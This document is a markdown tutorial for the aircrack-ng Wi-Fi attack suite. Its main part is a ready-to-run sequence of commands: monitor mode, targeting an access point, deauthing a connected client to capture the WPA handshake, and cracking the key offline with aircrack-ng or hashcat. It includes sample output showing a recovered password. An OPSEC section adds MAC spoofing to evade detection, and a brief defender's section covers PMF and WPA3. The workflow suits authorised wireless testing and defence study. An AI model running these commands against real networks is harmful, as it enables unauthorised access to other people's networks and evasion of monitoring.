# aircrack-ng — full tutorial

The classic Wi-Fi attack suite. Provides a toolkit for monitor-mode capture, deauth, packet injection, handshake capture, and offline cracking. Effective against WPA/WPA2-PSK; superseded by `hcxtools` for WPA3 / PMKID workflows.

## Install

```terminal
apt install aircrack-ng
brew install aircrack-ng    # macOS limited; Linux preferred
```

Wireless adapter must support **monitor mode** + **packet injection**. Verify with `iw list` → look for `monitor`, `mp`, `mp-active` modes. Recommended: Alfa AWUS036ACS, AWUS036NHA, Panda PAU09.

## The toolkit

| Tool | Purpose |
|------|---------|
| `airmon-ng` | Put NIC into monitor mode |
| `airodump-ng` | Capture frames; show APs/clients |
| `aireplay-ng` | Inject (deauth, fake-auth, replay) |
| `aircrack-ng` | Crack WEP / WPA-PSK from capture |
| `airbase-ng` | Rogue AP (WEP / open) |
| `airdecap-ng` | Decrypt capture given key |

## Standard workflow — WPA/WPA2-PSK handshake

### 1. Monitor mode

```terminal
sudo airmon-ng check kill           # disable wpa_supplicant / NetworkManager interference
sudo airmon-ng start wlan0          # creates wlan0mon
```

### 2. Survey

```terminal
sudo airodump-ng wlan0mon
# Shows BSSID  PWR  Beacons  Data  CH  ENC  ESSID  STATION (clients)
```

Pick a target — note BSSID, channel.

### 3. Targeted capture

```terminal
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w handshake wlan0mon
# Capture writes handshake-01.cap and friends
```

### 4. Force handshake — deauth a connected client

```terminal
# In another terminal:
sudo aireplay-ng --deauth 5 -a AA:BB:CC:DD:EE:FF -c <CLIENT-MAC> wlan0mon
```

When client reconnects, the 4-way handshake is in your capture. Top of `airodump-ng` shows `WPA handshake: AA:BB:...`.

### 5. Crack offline

```terminal
aircrack-ng -w rockyou.txt handshake-01.cap
# Or hashcat (faster):
hcxpcapngtool -o handshake.hc22000 handshake-01.cap
hashcat -m 22000 handshake.hc22000 rockyou.txt
```

## Aireplay-ng modes

| Mode | What it does |
|------|--------------|
| `--deauth N -a <bssid>` | Send N deauth frames |
| `--fakeauth ` | Fake associate to AP (WEP) |
| `--arpreplay` | ARP replay (WEP IV gathering) |
| `--chopchop` / `--fragment` | WEP-specific bit-flipping |
| `--caffe-latte` | Attack against client (WEP, no AP needed) |
| `--migmode` | Migration-mode WPA replay |
| `--test` | Test injection capability of NIC |

## Airodump-ng options

| Flag | Purpose |
|------|---------|
| `-c <ch>` | Lock channel (don't hop) |
| `--bssid <mac>` | Filter to one AP |
| `-w <prefix>` | Write capture |
| `--essid <name>` | Filter |
| `--manufacturer` | Lookup OUI vendors |
| `-d <ch_list>` | Multi-channel hopping list |
| `--wps` | Show WPS state |

## Good output

```
CH  6 ][ Elapsed: 18 s ][ 2026-04-30 11:33

 BSSID              PWR Beacons  #Data  #/s CH  MB   ENC  CIPHER AUTH ESSID
 AA:BB:CC:DD:EE:FF  -45     180     12    2   6 270  WPA2 CCMP   PSK  Acme-Corp
 11:22:33:44:55:66  -65      90      0    0  11 270  WPA2 CCMP   PSK  Guest

 BSSID              STATION            PWR  Rate    Lost  Frames  Notes
 AA:BB:CC:DD:EE:FF  AC:DE:48:00:11:22  -55  0 -24       0      45  WPA handshake: AA:BB:CC:DD:EE:FF
```

`WPA handshake` line confirms capture quality. Without it, cracking fails.

After `aircrack-ng`:

```
KEY FOUND! [ Spring2026! ]

Master Key     : 78 5A 3B ...
Transient Key  : 8F 4D ...
EAPOL HMAC     : 23 11 ...
```

## Bad output and fixes

| Symptom | Fix |
|---------|-----|
| `airmon-ng start` fails | Adapter doesn't support monitor — try a known-good chipset |
| No deauth effect | Distance / power; PMF (802.11w) on AP blocks deauth — pivot to PMKID |
| Capture shows clients but no handshake line | Need a fresh association — wait or deauth |
| `aircrack-ng` says "no networks found" | Capture didn't include the EAPOL frames — re-capture |
| Cracking too slow on CPU | Use `hashcat -m 22000` on GPU |

## Defender's perspective

- Burst of broadcast deauth frames from a non-AP MAC = textbook WiFi attack.
- WIDS systems (Cisco, Aruba, Mist) detect this in real time.
- Modern enterprise should enable **802.11w (PMF)** to make deauth ineffective.
- WPA3 + SAE eliminates offline-handshake cracking altogether.

## OPSEC

- Spoof your MAC: `macchanger -r wlan0mon`.
- Deauth radiates physically — measurable by RF-monitoring guards.
- WPA3 + PMF make this entire workflow obsolete; use `hcxdumptool` for PMKID-only attempts in mixed environments.

## Related tools

| Tool | Niche |
|------|-------|
| **hcxdumptool / hcxtools** | PMKID-only (no client needed) + WPA3-aware |
| **bettercap** | Modern menu-driven WiFi/Bluetooth/HID |
| **wifite2** | Wraps everything with a TUI |
| **kismet** | Wireless surveying / IDS |
| **fluxion** | Evil-twin + captive portal automation |
| **eaphammer** | WPA-Enterprise (PEAP/MSCHAPv2) attacks |
